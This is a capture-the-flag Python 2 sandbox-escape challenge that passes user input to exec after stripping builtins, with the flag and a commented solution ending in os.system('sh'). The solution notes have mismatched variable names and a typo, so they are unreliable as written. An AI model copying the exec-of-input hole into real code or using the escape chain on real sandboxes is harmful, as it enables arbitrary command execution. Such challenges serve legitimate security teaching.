#!/usr/bin/python -u
# task5.py
# A real challenge for those python masters out there :)

from sys import modules
modules.clear()
del modules

_raw_input = raw_input
_BaseException = BaseException
_EOFError = EOFError

__builtins__.__dict__.clear()
__builtins__ = None

print 'Get a shell, if you can...'

while 1:
	try:
		d = {'x':None}
		exec 'x='+_raw_input() in d
		print 'Return Value:', d['x']
		print d
	except _EOFError, e:
		raise e
	except _BaseException, e:
		print 'Exception:', e

# flag: you_are_the_pyeval_master

# __builtins__['b']=[].__class__.__base__
# __builtins__['w']=w.__subclassess__()[53]
# __builtins__['l']=p.__enter__.__func__.__globals__
# __builtins__['lc']=l['linecache']
# __builtins__['os']=lc.checkcache.__globals__['os']
# os.system('sh')